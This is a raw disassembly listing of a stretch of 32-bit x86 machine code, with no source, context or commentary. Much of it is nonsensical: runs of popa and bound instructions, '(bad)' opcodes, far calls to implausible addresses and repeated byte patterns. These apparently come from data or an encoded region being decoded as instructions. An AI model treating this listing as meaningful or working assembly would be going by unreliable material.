  430ec0:	push   edi
  430ec1:	and    al,BYTE PTR [esi-0x305b349f]
  430ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430ec8:	or     eax,0x8e750d64
  430ecd:	push   0x55d23875
  430ed2:	or     eax,0xb2688ab2
  430ed7:	jbe    0x430e7d
  430ed9:	or     eax,0x12ac7eb2
  430ede:	enter  0xcc1a,0x63
  430ee2:	fsub   DWORD PTR [eax+0x62]
  430ee5:	inc    ebp
  430ee6:	dec    eax
  430ee7:	dec    edx
  430ee8:	pop    eax
  430ee9:	rcr    BYTE PTR [edx],cl
  430eeb:	push   edx
  430eec:	fsub   DWORD PTR [eax+0x62]
  430eef:	inc    ebp
  430ef0:	dec    eax
  430ef1:	dec    edx
  430ef2:	pop    eax
  430ef3:	rcr    BYTE PTR [edi+0x4e],cl
  430ef6:	or     eax,0x8664d863
  430efb:	sub    eax,0xd2d2a21c
  430f00:	rcl    dl,cl
  430f02:	ror    bl,cl
  430f04:	sub    eax,0x4dd8a44b
  430f09:	bound  edx,QWORD PTR [ecx+eiz*2]
  430f0c:	push   esi
  430f0d:	popa   
  430f0e:	popa   
  430f0f:	inc    ebp
  430f10:	dec    eax
  430f11:	adc    eax,DWORD PTR [esp+eax*4]
  430f14:	cmp    ah,BYTE PTR [ecx+0x61]
  430f17:	adc    al,0x61
  430f19:	mul    DWORD PTR [ecx-0x9]
  430f1c:	dec    edi
  430f1d:	lock gs scas al,BYTE PTR es:[edi]
  430f20:	jo     0x430f56
  430f22:	shl    ebx,0x16
  430f25:	pop    edi
  430f26:	popa   
  430f27:	popa   
  430f28:	xor    BYTE PTR ss:[ebx],dl
  430f2b:	test   BYTE PTR [ebx],dl
  430f2d:	mov    ds:0xd55ea0d,eax
  430f32:	jne    0x430f65
  430f34:	sub    eax,0x217f8eea
  430f39:	pop    ss
  430f3a:	jne    0x430f2f
  430f3c:	lods   eax,DWORD PTR ds:[esi]
  430f3d:	popa   
  430f3e:	repz xor eax,0x9361615f
  430f44:	loop   0x430f2a
  430f46:	popa   
  430f47:	popa   
  430f48:	popa   
  430f49:	sbb    cl,ch
  430f4b:	pop    ebp
  430f4c:	jg     0x430f38
  430f4e:	fs inc ebp
  430f50:	ret    0xf0db
  430f53:	call   0x56ca:0xed45474b
  430f5a:	arpl   WORD PTR [ebx+edx*1-0x3de0236a],di
  430f61:	call   0xdd10:0x13c03a96
  430f68:	out    0x8c,al
  430f6a:	popa   
  430f6b:	popa   
  430f6c:	leave  
  430f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430f6e:	push   ds
  430f6f:	popa   
  430f70:	push   0xadd26161
  430f75:	push   0xea0d9ee8
  430f7a:	push   ebp
  430f7b:	sub    eax,0x6933cea
  430f80:	mov    ds:0x4f4c710d,eax
  430f85:	ret    0x520d
  430f88:	jg     0x430fd4
  430f8a:	push   esi
  430f8b:	push   edx
  430f8c:	adc    esp,esi
  430f8e:	int    0x61
  430f90:	rep lods eax,DWORD PTR ds:[esi]
  430f92:	pop    edi
  430f93:	popa   
  430f94:	popa   
  430f95:	or     eax,0x9aed1f60
  430f9a:	fdivr  DWORD PTR [edi]
  430f9c:	push   0x611e6fa7
  430fa1:	push   0x8cb26161
  430fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430fa7:	(bad)  
  430fa8:	call   0xdc1fdfe
  430fad:	jno    0x430ffb
  430faf:	maxss  xmm4,DWORD PTR [ecx+0x61]
  430fb4:	mov    ds:0x68f3d874,al
  430fb9:	fsubr  st,st(5)
  430fbb:	push   0x64e8ffa7
  430fc0:	rcr    BYTE PTR [eax-0x2fcb9828],0xd
  430fc7:	dec    esi
  430fc8:	call   0x681ba860
  430fcd:	xchg   edi,eax
  430fce:	shr    BYTE PTR [edi],1
  430fd0:	mul    DWORD PTR [ebx+0x57]
  430fd3:	call   0x637d3fcf
  430fd8:	push   edi
  430fd9:	sub    eax,0xd3eec84f
  430fde:	lods   eax,DWORD PTR ds:[esi]
  430fdf:	pop    ds
  430fe0:	arpl   WORD PTR [eax-0xd],sp
  430fe3:	rcr    DWORD PTR [edi+0x61],cl
  430fe6:	popa   
  430fe7:	mov    dl,0x7e
  430fe9:	retf   0xc0c3
  430fec:	rol    eax,0xc1
  430fef:	bound  ebx,QWORD PTR [esi+0x2ac8c98e]
  430ff5:	into   
  430ff6:	cmp    esp,DWORD PTR [ecx+0x61]
  430ff9:	das    
  430ffa:	popa   
  430ffb:	out    dx,al
  430ffc:	jae    0x430fab
  430ffe:	push   ebx
  430fff:	arpl   WORD PTR [eax-0xd],sp
  431002:	jb     0x431063
  431004:	popa   
  431005:	popa   
  431006:	mov    dl,0x32
  431008:	lods   eax,DWORD PTR ds:[esi]
  431009:	outs   dx,DWORD PTR ds:[esi]
  43100a:	arpl   WORD PTR [eax-0xd],sp
  43100d:	imul   ebx,DWORD PTR [edi+0x61],0x61
  431011:	mov    dl,0xcf
  431013:	retf   0x3a96
  431016:	lods   eax,DWORD PTR ds:[esi]
  431017:	xchg   ecx,eax
  431018:	call   0xd2dabd7c
  43101d:	or     eax,0xb22d55b2
  431022:	cmp    al,0xa7
  431024:	mov    dl,0x8e
  431026:	xchg   ebx,eax
  431027:	(bad)  [edi+0x68]
  43102a:	popa   
  43102b:	popa   
  43102c:	mov    cl,0xd
  43102e:	jmp    0x6168:0xef0bb55
  431035:	popa   
  431036:	lods   eax,DWORD PTR ds:[esi]
  431037:	push   eax
  431038:	repz xor BYTE PTR [eax+0x61],ch
  43103c:	popa   
  43103d:	or     eax,0x87e750b2
  431042:	lods   eax,DWORD PTR ds:[esi]
  431043:	sbb    bl,dh
  431045:	in     al,dx
  431046:	push   0xb20d6161
  43104b:	sub    bh,ah
  43104d:	xchg   ecx,eax
  43104e:	or     eax,0xcd0d58b2
  431053:	sub    BYTE PTR [edi],dl
  431055:	int    0x58
  431057:	or     eax,0xcd1750cd
  43105c:	sub    BYTE PTR ds:0xcd173ccd,cl
  431062:	push   eax
  431063:	pop    ss
  431064:	mov    dl,0x3c
  431066:	retf   0xc1c3
  431069:	sub    bh,BYTE PTR [edx-0x70]
  43106c:	popa   
  43106d:	popa   
  43106e:	das    
  43106f:	call   0x3a96:0xcbc85156
  431076:	sbb    bl,BYTE PTR [edi]
  431078:	call   0xd29a07dc
  43107d:	or     eax,0x1ef34c71
  431082:	push   0x7eb26161
  431087:	or     eax,0xea0df375
  43108c:	dec    esp
  43108d:	pop    ds
  43108e:	dec    eax
  43108f:	push   esi
  431090:	sub    eax,0xbc9a7057
  431095:	adc    ebx,edi
  431097:	fwait
  431098:	imul   esi
  43109a:	test   DWORD PTR ds:0xf4d84c71,ecx
  4310a0:	pop    edi
  4310a1:	repz cld 
  4310a3:	push   0x8ab26161
  4310a8:	or     eax,0xea0df375
  4310ad:	dec    esp
  4310ae:	pop    ds
  4310af:	dec    eax
  4310b0:	push   esi
  4310b1:	jo     0x43104d
  4310b3:	shl    DWORD PTR [eax-0x66],0xbc
  4310b7:	adc    esp,DWORD PTR [eax]
  4310b9:	fwait
  4310ba:	imul   DWORD PTR [eax+0x61]
  4310bd:	popa   
  4310be:	out    dx,al
  4310bf:	xchg   edx,eax
  4310c0:	sub    edi,esi
  4310c2:	pop    edi
  4310c3:	popa   
  4310c4:	popa   
  4310c5:	push   esi
  4310c6:	jmp    0x611e:0xc192704c
  4310cd:	push   0xcd176161
  4310d2:	sbb    BYTE PTR ds:0xfa0da21c,ch
  4310d8:	repz jp 0x431143
  4310db:	popa   
  4310dc:	popa   
  4310dd:	or     eax,0xe8522d60
  4310e2:	gs push 0xead818cd
  4310e8:	stc    
  4310e9:	not    DWORD PTR [ebx+0x6161add8]
  4310ef:	popa   
  4310f0:	fdiv   DWORD PTR [ebp-0x7]
  4310f3:	cmp    cl,BYTE PTR ds:0x30d818cd
  4310f9:	imul   eax
  4310fb:	push   esi
  4310fc:	jo     0x431154
  4310fe:	ror    DWORD PTR ds:0x3f1f60ea,0x3b
  431105:	sub    eax,0xa270a21c
  43110a:	mov    esp,0x40d32013
  43110f:	push   esi
  431110:	popa   
  431111:	popa   
  431112:	or     eax,0x68a6f3fa
  431117:	popa   
  431118:	popa   
  431119:	or     eax,0xe8522d60
  43111e:	gs pop ss
  431120:	int    0xf3
  431122:	pop    ss
  431123:	int    0x3c
  431125:	fdiv   DWORD PTR [eax]
  431127:	imul   eax
  431129:	jae    0x431138
  43112b:	outs   dx,DWORD PTR ds:[esi]
  43112c:	fcom   DWORD PTR [ebp-0x12b097c4]
  431132:	fmul   st,st(5)
  431134:	cmp    al,0x5f
  431136:	int3   
  431137:	fdiv   DWORD PTR [eax]
  431139:	mov    WORD PTR [ebx-0x7f],?
  43113c:	adc    al,0xba
  43113e:	pop    edi
  43113f:	popa   
  431140:	popa   
  431141:	sub    eax,0x46520d1f
  431146:	xchg   ebp,eax
  431147:	cmp    al,0x56
  431149:	jne    0x431187
  43114b:	dec    edi
  43114c:	dec    eax
  43114d:	push   esi
  43114e:	jne    0x4311b0
  431150:	pop    ss
  431151:	jne    0x43119f
  431153:	out    dx,al
  431154:	xor    ebx,eax
  431156:	in     eax,dx
  431157:	div    ebx
  431159:	pop    ebx
  43115a:	popa   
  43115b:	popa   
  43115c:	popa   
  43115d:	dec    edi
  43115e:	out    dx,al
  43115f:	dec    edi
  431160:	xchg   ebp,eax
  431161:	cmp    al,0xa1
  431163:	mov    ebp,0x623be848
  431168:	jne    0x4311a6
  43116a:	aaa    
  43116b:	mov    ebp,0xf3b2cc48
  431170:	adc    al,0x2c
  431172:	cmp    esp,DWORD PTR [ecx+0x61]
  431175:	push   esi
  431176:	jne    0x4311d8
  431178:	pop    ss
  431179:	jne    0x4311c7
  43117b:	pop    ds
  43117c:	xchg   ebp,eax
  43117d:	cmp    al,0xf7
  43117f:	jo     0x431178
  431181:	mov    esp,0xd9b622d
  431186:	and    DWORD PTR ds:0x6f34c71,ecx
  43118c:	popa   
  43118d:	popa   
  43118e:	popa   
  43118f:	and    al,0x68
  431191:	out    0x56,eax
  431193:	xchg   ecx,eax
  431194:	jmp    0x64b2:0xccc24f3c
  43119b:	out    dx,al
  43119c:	popa   
  43119d:	bound  esi,QWORD PTR [ebp+0x3c]
  4311a0:	or     eax,0x1fd818cd
  4311a5:	pop    edi
  4311a6:	or     eax,0x210d55ea
  4311ab:	sub    eax,0x75a18e75
  4311b0:	cmp    al,0xc4
  4311b2:	ror    BYTE PTR ds:0x3cb22d4a,1
  4311b8:	or     eax,0xbbb138a5
  4311bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4311be:	addr16 jae 0x431217
  4311c1:	shl    DWORD PTR [edx+0x55ea174a],1
  4311c7:	xchg   ebx,eax
  4311c8:	push   es
  4311c9:	xor    DWORD PTR [edi-0x266cc716],esp
  4311cf:	(bad)  
  4311d0:	pop    esp
  4311d1:	bound  esp,QWORD PTR [edx-0xd]
  4311d4:	cs popa 
  4311d6:	popa   
  4311d7:	popa   
  4311d8:	sub    eax,0x8ee6131c
  4311dd:	xchg   esi,eax
  4311de:	or     eax,0xb20dfba5
  4311e3:	imul   ebp,DWORD PTR ds:0xa8178ab2,0xda6a50d
  4311ed:	jmp    0xa017:0x8eea2d55
  4311f4:	push   edi
  4311f5:	(bad)  
  4311f6:	mov    esp,0x617622c3
  4311fb:	mov    esp,0xa21c2dca
  431200:	out    dx,al
  431201:	push   eax
  431202:	(bad)  
  431203:	pop    esi
  431204:	popa   
  431205:	popa   
  431206:	popa   
  431207:	push   0x1f1568e8
  43120c:	xor    eax,0xb20da49a
  431211:	imul   esp,DWORD PTR [edi+0x187376b2],0x1f48750d
  43121b:	dec    eax
  43121c:	call   0xb217:0x487517b1
  431223:	imul   edi,DWORD PTR [ebp+edx*1-0x6c0632f3],0x3f1f1c06
  43122e:	not    DWORD PTR [esi+0x75]
  431231:	repz push esi
  431233:	pop    ds
  431234:	out    dx,al
  431235:	cmp    edx,DWORD PTR [ebx+0x75561c06]
  43123b:	stc    
  43123c:	or     eax,0xe6136071
  431241:	jne    0x4312a4
  431243:	sub    eax,0x75e6131c
  431248:	popa   
  431249:	(bad)  
  43124a:	pop    esi
  43124b:	popa   
  43124c:	popa   
  43124d:	popa   
  43124e:	push   0xc60d7673
  431253:	mov    gs,WORD PTR [edx-0x47131e1]
  431259:	call   0x173:0xb68ec6a7
  431260:	sbb    cl,BYTE PTR [ecx-0x5571d39e]
  431266:	pop    ds
  431267:	xor    eax,0x8ebe049a
  43126c:	sti    
  43126d:	or     eax,0xa5f2934d
  431272:	popa   
  431273:	pop    ds
  431274:	lock xchg edi,eax
  431276:	xchg   ebx,eax
  431277:	mov    edx,0x8ec6a14e
  43127c:	sti    
  43127d:	jae    0x43120a
  43127f:	or     eax,0x9a612747
  431284:	popa   
  431285:	popa   
  431286:	sub    eax,0x34f01f4e
  43128b:	xchg   esp,eax
  43128c:	push   0x1c5661cd
  431291:	adc    esp,esi
  431293:	mov    fs,WORD PTR [edx+0x34f11f15]
  431299:	aaa    
  43129a:	(bad)  
  43129b:	mov    ?,ebx
  43129d:	sub    eax,0xa5379447
  4312a2:	popa   
  4312a3:	push   esi
  4312a4:	sbb    al,0xd8
  4312a6:	sbb    al,0x68
  4312a8:	adc    esp,esi
  4312aa:	mov    fs,WORD PTR [edx+0x640da515]
  4312b0:	(bad)  
  4312b1:	mov    fs:0xa461615f,al
  4312b7:	retf   
  4312b8:	and    edx,esp
  4312ba:	jp     0x43131e
  4312bc:	bound  esp,QWORD PTR [edx-0x53]
  4312bf:	loop   0x4312c2
  4312c1:	imul   esp,DWORD PTR [ecx],0x626240e2
  4312c7:	bound  esp,QWORD PTR ds:0xd6901e2
  4312cd:	jne    0x431269
  4312cf:	pop    ss
  4312d0:	jne    0x4312f6
  4312d2:	or     eax,0x62627ae2
  4312d7:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4312dd:	xor    al,0x5e
  4312df:	call   0xe25a748c
  4312e4:	into   
  4312e5:	bound  esp,QWORD PTR [edx+0x62]
  4312e8:	or     eax,0x62627ae2
  4312ed:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4312f3:	xor    al,0x5e
  4312f5:	call   0x755a74a2
  4312fa:	pop    ebp
  4312fb:	or     eax,0x62627ae2
  431300:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431306:	xor    al,0x5e
  431308:	call   0x755a74b5
  43130d:	adc    al,0xd
  43130f:	loop   0x43138b
  431311:	bound  esp,QWORD PTR [edx+0x62]
  431314:	test   DWORD PTR [ebx],ecx
  431316:	call   0xa8e8:0x5e343ac9
  43131d:	popa   
  43131e:	pop    ss
  43131f:	jne    0x431341
  431321:	and    DWORD PTR [ebp+0x1c],esi
  431324:	lods   eax,DWORD PTR ds:[esi]
  431325:	xor    al,0x9
  431327:	imul   esp,DWORD PTR [ecx],0x6262e6e2
  43132d:	bound  ebp,QWORD PTR [ebp+0x2169010b]
  431333:	jne    0x4312e2
  431335:	and    dl,ah
  431337:	add    DWORD PTR [ecx+0x21],ebp
  43133a:	jne    0x431335
  43133c:	aam    0x61
  43133e:	popa   
  43133f:	popa   
  431340:	and    edx,esp
  431342:	jmp    0x4313a6
  431344:	bound  esp,QWORD PTR [edx-0x2c]
  431347:	popa   
  431348:	popa   
  431349:	popa   
  43134a:	and    DWORD PTR [ebp+0x69],esi
  43134d:	xchg   esp,eax
  43134e:	popa   
  43134f:	popa   
  431350:	popa   
  431351:	and    edx,esp
  431353:	out    0x62,eax
  431355:	bound  esp,QWORD PTR [edx-0x6c]
  431358:	popa   
  431359:	popa   
  43135a:	popa   
  43135b:	and    DWORD PTR [ebp+0x31],esi
  43135e:	int3   
  43135f:	popa   
  431360:	popa   
  431361:	popa   
  431362:	and    edx,esp
  431364:	fbld   TBYTE PTR [edx+0x62]
  431367:	bound  ebp,QWORD PTR [ecx+eiz*2]
  43136a:	popa   
  43136b:	popa   
  43136c:	or     eax,0x62627ae2
  431371:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431377:	xor    al,0x5e
  431379:	call   0x755a7526
  43137e:	dec    esp
  43137f:	or     eax,0x62627ae2
  431384:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43138a:	xor    al,0x5e
  43138c:	call   0xe25a7539
  431391:	jecxz  0x4313f5
  431393:	bound  esp,QWORD PTR [edx-0x28]
  431396:	pop    ebx
  431397:	mov    dh,0x62
  431399:	bound  esp,QWORD PTR [edx+0x61]
  43139c:	out    dx,al
  43139d:	lea    ecx,ds:0x6262b6e2
  4313a3:	bound  esp,QWORD PTR [edx+0x62b6e217]
  4313a9:	bound  esp,QWORD PTR [edx-0x2a]
  4313ac:	and    esi,DWORD PTR [esi-0x359d9d9e]
  4313b2:	pop    edi
  4313b3:	popa   
  4313b4:	popa   
  4313b5:	jae    0x43135b
  4313b7:	fcomp  DWORD PTR [ebx-0x36]
  4313ba:	bound  esp,QWORD PTR [edx+0x62]
  4313bd:	popa   
  4313be:	out    dx,al
  4313bf:	lea    ecx,ds:0x6262cae2
  4313c5:	bound  esp,QWORD PTR [edx+0x62cae217]
  4313cb:	bound  esp,QWORD PTR [edx-0x28]
  4313ce:	and    ecx,edx
  4313d0:	bound  esp,QWORD PTR [edx+0x62]
  4313d3:	test   BYTE PTR [ebx-0x7b],dh
  4313d6:	fcomp  DWORD PTR [ebx-0x42]
  4313d9:	bound  esp,QWORD PTR [edx+0x62]
  4313dc:	popa   
  4313dd:	out    dx,al
  4313de:	lea    ecx,ds:0x6262bee2
  4313e4:	bound  esp,QWORD PTR [edx+0x62bee217]
  4313ea:	bound  esp,QWORD PTR [edx-0x28]
  4313ed:	and    edi,DWORD PTR [esi-0x1e9d9d9e]
  4313f3:	jae    0x431473
  4313f5:	adc    esi,DWORD PTR [ebp-0x25]
  4313f8:	rcl    BYTE PTR [ebx],cl
  4313fa:	jne    0x431454
  4313fc:	sar    BYTE PTR [edx+0x52],cl
  4313ff:	addr16 loop 0x43146b
  431402:	repz cld 
  431404:	js     0x431467
  431406:	popa   
  431407:	out    dx,al
  431408:	es out dx,al
  43140a:	or     ebp,esi
  43140c:	mov    ebp,db6
  43140f:	std    
  431410:	mov    WORD PTR [edx-0x1df29e9f],fs
  431416:	jp     0x43147a
  431418:	bound  esp,QWORD PTR [edx-0x7b]
  43141b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431421:	call   0x755a75ce
  431426:	pusha  
  431427:	or     eax,0x62627ae2
  43142c:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431432:	xor    al,0x5e
  431434:	call   0x755a75e1
  431439:	push   esp
  43143a:	fcom   DWORD PTR [ebp-0x7319e4f]
  431440:	mov    ah,BYTE PTR [ecx+0x61]
  431443:	popa   
  431444:	pop    ss
  431445:	jne    0x4313f8
  431447:	or     eax,0xa20db175
  43144c:	jb     0x431465
  43144e:	jne    0x431458
  431450:	or     eax,0xa20d0875
  431455:	xchg   BYTE PTR [edi],dl
  431457:	jne    0x4314ae
  431459:	or     eax,0xcd132475
  43145e:	mov    cl,0x17
  431460:	add    al,0xfd
  431462:	push   0x750d6161
  431467:	and    al,0x13
  431469:	int    0x8
  43146b:	pop    ss
  43146c:	add    al,0x54
  43146e:	push   0x750d6161
  431473:	and    al,0x13
  431475:	int    0x55
  431477:	pop    ss
  431478:	add    al,0x24
  43147a:	push   0xb0d6161
  43147f:	jp     0x4314e3
  431481:	bound  esp,QWORD PTR [edx-0x2a]
  431484:	dec    ebx
  431485:	or     ebx,DWORD PTR [edx-0x29c537]
  43148b:	pop    esi
  43148c:	call   0xb2a57639
  431491:	and    al,0xf3
  431493:	mov    ebx,edx
  431495:	popa   
  431496:	popa   
  431497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431498:	xor    DWORD PTR [ebx+0x6134826e],edx
  43149e:	popa   
  43149f:	or     eax,0xdb0d2475
  4314a4:	jmp    0xda47611
  4314a9:	int    0x24
  4314ab:	or     eax,0x6168e917
  4314b0:	popa   
  4314b1:	or     eax,0x56610d91
  4314b6:	cdq    
  4314b7:	xchg   esi,eax
  4314b8:	pop    ss
  4314b9:	loop   0x4314b2
  4314bb:	bound  esp,QWORD PTR [edx+0x62]
  4314be:	adc    esp,edx
  4314c0:	call   0xf770:0xd2626262
  4314c7:	or     eax,0x6262f7e2
  4314cc:	bound  esp,QWORD PTR [edx-0x53]
  4314cf:	adc    BYTE PTR [ecx+0x61],ah
  4314d2:	popa   
  4314d3:	or     eax,0xdb0d2475
  4314d8:	adc    BYTE PTR [eax+0x61],ch
  4314db:	popa   
  4314dc:	or     eax,0xf7130d61
  4314e1:	bound  esp,QWORD PTR [edx+0x62]
  4314e4:	push   esi
  4314e5:	(bad)  
  4314e6:	add    al,0x61
  4314e8:	popa   
  4314e9:	popa   
  4314ea:	ror    BYTE PTR ds:0xdb0d2475,cl
  4314f0:	dec    eax
  4314f1:	push   0xd2626161
  4314f6:	jbe    0x4314f7
  4314f8:	loop   0x431480
  4314fa:	bound  esp,QWORD PTR [edx+0x62]
  4314fd:	ret    0xe2ff
  431500:	lea    esp,[edx+0x62]
  431503:	(bad)  {k2}{z}
  431508:	bound  esp,QWORD PTR [edx+0x62]
  43150b:	cli    
  43150c:	jmp    edx
  43150e:	xchg   ebx,eax
  43150f:	bound  esp,QWORD PTR [edx+0x62]
  431512:	lock jmp edx
  431515:	xchg   edx,eax
  431516:	bound  esp,QWORD PTR [edx+0x62]
  431519:	push   eax
  43151a:	jmp    edx
  43151c:	mov    DWORD PTR [edx+0x62],esp
  43151f:	bound  edx,QWORD PTR [esi]
  431521:	jmp    edx
  431523:	mov    BYTE PTR [edx+0x62],ah
  431526:	(bad)  
  431527:	out    dx,al
  431528:	jmp    edx
  43152a:	(bad)  
  43152b:	bound  esp,QWORD PTR [edx+0x62]
  43152e:	ss jmp edx
  431531:	jle    0x431595
  431533:	bound  esp,QWORD PTR [edx+0x2a]
  431536:	jmp    edx
  431538:	imul   esp,DWORD PTR [edx+0x62],0x62
  43153c:	loopne 0x43153d
  43153e:	loop   0x4314e6
  431540:	bound  esp,QWORD PTR [edx+0x62]
  431543:	and    bh,bh
  431545:	loop   0x43157a
  431547:	bound  esp,QWORD PTR [edx+0x62]
  43154a:	repz jmp edx
  43154d:	xor    ah,BYTE PTR [edx+0x62]
  431550:	bound  edx,QWORD PTR [edi+edi*8]
  431553:	loop   0x43158e
  431555:	bound  esp,QWORD PTR [edx+0x62]
  431558:	xor    eax,0x6272e2ff
  43155d:	bound  esp,QWORD PTR [edx+0x3e]
  431560:	jmp    edx
  431562:	test   eax,0xf0626262
  431567:	jmp    edx
  431569:	test   al,0x62
  43156b:	bound  esp,QWORD PTR [edx+0x2a]
  43156e:	jmp    edx
  431570:	scas   eax,DWORD PTR es:[edi]
  431571:	bound  esp,QWORD PTR [edx+0x62]
  431574:	ret    0xe2ff
  431577:	sahf   
  431578:	bound  esp,QWORD PTR [edx+0x62]
  43157b:	out    dx,al
  43157c:	jmp    edx
  43157e:	test   DWORD PTR [edx+0x62],esp
  431581:	bound  esi,QWORD PTR ds:0x6284e2ff
  431587:	bound  esp,QWORD PTR [edx+0x3e]
  43158a:	jmp    edx
  43158c:	stos   DWORD PTR es:[edi],eax
  43158d:	bound  esp,QWORD PTR [edx+0x62]
  431590:	hlt    
  431591:	jmp    edx
  431593:	stos   BYTE PTR es:[edi],al
  431594:	bound  esp,QWORD PTR [edx+0x62]
  431597:	in     eax,dx
  431598:	jmp    edx
  43159a:	mov    eax,ds:0x16626262
  43159f:	jmp    edx
  4315a1:	mov    al,ds:0x42626262
  4315a6:	jmp    edx
  4315a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4315a9:	bound  esp,QWORD PTR [edx+0x62]
  4315ac:	lock jmp edx
  4315af:	xchg   esi,eax
  4315b0:	bound  esp,QWORD PTR [edx+0x62]
  4315b3:	ss jmp edx
  4315b6:	popf   
  4315b7:	bound  esp,QWORD PTR [edx+0x62]
  4315ba:	push   eax
  4315bb:	jmp    edx
  4315bd:	pushf  
  4315be:	bound  esp,QWORD PTR [edx+0x62]
  4315c1:	sub    bh,bh
  4315c3:	loop   0x431568
  4315c5:	bound  esp,QWORD PTR [edx+0x62]
  4315c8:	loopne 0x4315c9
  4315ca:	loop   0x431556
  4315cc:	bound  esp,QWORD PTR [edx+0x62]
  4315cf:	and    bh,bh
  4315d1:	loop   0x431554
  4315d3:	bound  esp,QWORD PTR [edx+0x62]
  4315d6:	repz jmp edx
  4315d9:	and    BYTE PTR [edx+0x62],0x62
  4315dd:	adc    al,0xff
  4315df:	loop   0x431568
  4315e1:	bound  esp,QWORD PTR [edx+0x62]
  4315e4:	xor    eax,0x6276e2ff
  4315e9:	bound  esp,QWORD PTR [edx+0x3e]
  4315ec:	jmp    edx
  4315ee:	jge    0x431652
  4315f0:	bound  esp,QWORD PTR [edx-0x10]
  4315f3:	jmp    edx
  4315f5:	jl     0x431659
  4315f7:	bound  esp,QWORD PTR [edx+0x2a]
  4315fa:	jmp    edx
  4315fc:	and    DWORD PTR [edx+0x62],0x62
  431600:	ret    0xe2ff
  431603:	sti    
  431604:	bound  esp,QWORD PTR [edx+0x62]
  431607:	out    dx,al
  431608:	jmp    edx
  43160a:	jns    0x43166e
  43160c:	bound  esp,QWORD PTR [edx+0x35]
  43160f:	jmp    edx
  431611:	js     0x431675
  431613:	bound  esp,QWORD PTR [edx+0x3e]
  431616:	jmp    edx
  431618:	jg     0x43167c
  43161a:	bound  esp,QWORD PTR [edx-0xc]
  43161d:	jmp    edx
  43161f:	mov    fs,WORD PTR [edx+0x62]
  431622:	(bad)  
  431623:	in     eax,dx
  431624:	jmp    edx
  431626:	aad    0x62
  431628:	bound  esp,QWORD PTR [edx+0x16]
  43162b:	jmp    edx
  43162d:	aam    0x62
  43162f:	bound  esp,QWORD PTR [edx+0x42]
  431632:	jmp    edx
  431634:	add    ah,BYTE PTR [edx+0x62]
  431637:	(bad)  
  431638:	lock jmp edx
  43163b:	cmp    BYTE PTR [edx+0x62],ah
  43163e:	bound  esi,QWORD PTR [esi]
  431640:	jmp    edx
  431642:	aaa    
  431643:	bound  esp,QWORD PTR [edx+0x62]
  431646:	push   eax
  431647:	jmp    edx
  431649:	bound  esp,QWORD PTR cs:[edx+0x62]
  43164d:	dec    esp
  43164e:	jmp    edx
  431650:	sub    eax,0xe0626262
  431655:	jmp    edx
  431657:	arpl   WORD PTR fs:[edx+0x62],sp
  43165b:	and    bh,bh
  43165d:	loop   0x43164b
  43165f:	arpl   WORD PTR [edx+0x62],sp
  431662:	repz jmp edx
  431665:	in     eax,dx
  431666:	arpl   WORD PTR [edx+0x62],sp
  431669:	adc    al,0xff
  43166b:	loop   0x431667
  43166d:	arpl   WORD PTR [edx+0x62],sp
  431670:	xor    eax,0x6331e2ff
  431675:	bound  esp,QWORD PTR [edx+0x3e]
  431678:	jmp    edx
  43167a:	outs   dx,DWORD PTR ds:[esi]
  43167b:	arpl   WORD PTR [edx+0x62],sp
  43167e:	lock jmp edx
  431681:	data16 arpl WORD PTR [edx+0x62],sp
  431685:	and    edi,edi
  431687:	loop   0x4316ee
  431689:	arpl   WORD PTR [edx+0x62],sp
  43168c:	sbb    bh,bh
  43168e:	loop   0x4316ed
  431690:	arpl   WORD PTR [edx+0x62],sp
  431693:	fs jmp edx
  431696:	inc    esp
  431697:	arpl   WORD PTR [edx+0x62],sp
  43169a:	inc    edx
  43169b:	jmp    edx
  43169d:	dec    ebx
  43169e:	arpl   WORD PTR [edx+0x62],sp
  4316a1:	lock jmp edx
  4316a4:	dec    edx
  4316a5:	arpl   WORD PTR [edx+0x62],sp
  4316a8:	sub    bh,bh
  4316aa:	loop   0x431715
  4316ac:	arpl   WORD PTR [edx+0x62],sp
  4316af:	loopne 0x431660
  4316b1:	sbb    al,0x13
  4316b3:	and    esi,DWORD PTR [eax]
  4316b5:	arpl   WORD PTR [edx+0x62],sp
  4316b8:	scas   al,BYTE PTR es:[edi]
  4316b9:	xchg   esp,eax
  4316ba:	scas   al,BYTE PTR es:[edi]
  4316bb:	mov    ebx,0x62a2e2ff
  4316c0:	bound  esp,QWORD PTR [edx+0x22]
  4316c3:	jmp    edx
  4316c5:	cdq    
  4316c6:	bound  esp,QWORD PTR [edx+0x62]
  4316c9:	repz jmp edx
  4316cc:	cwde   
  4316cd:	bound  esp,QWORD PTR [edx+0x62]
  4316d0:	adc    al,0xff
  4316d2:	loop   0x431673
  4316d4:	bound  esp,QWORD PTR [edx+0x62]
  4316d7:	xor    eax,0x622ce2ff
  4316dc:	bound  esp,QWORD PTR [edx+0x3e]
  4316df:	jmp    edx
  4316e1:	jne    0x431745
  4316e3:	bound  esp,QWORD PTR [edx-0x10]
  4316e6:	jmp    edx
  4316e8:	je     0x43174c
  4316ea:	bound  esp,QWORD PTR [edx+0x21]
  4316ed:	jmp    edx
  4316ef:	fwait
  4316f0:	bound  esp,QWORD PTR [edx+0x62]
  4316f3:	sbb    bh,bh
  4316f5:	loop   0x4316d1
  4316f7:	bound  esp,QWORD PTR [edx+0x62]
  4316fa:	fs jmp edx
  4316fd:	shl    DWORD PTR [edx+0x62],1
  431700:	bound  eax,QWORD PTR [edx-0x1]
  431703:	loop   0x4316d5
  431705:	bound  esp,QWORD PTR [edx+0x62]
  431708:	lock jmp edx
  43170b:	xlat   BYTE PTR ds:[ebx]
  43170c:	bound  esp,QWORD PTR [edx+0x62]
  43170f:	dec    esp
  431710:	jmp    edx
  431712:	(bad)  
  431713:	bound  esp,QWORD PTR [edx+0x62]
  431716:	loopne 0x4316c7
  431718:	sbb    al,0x13
  43171a:	and    ecx,ebp
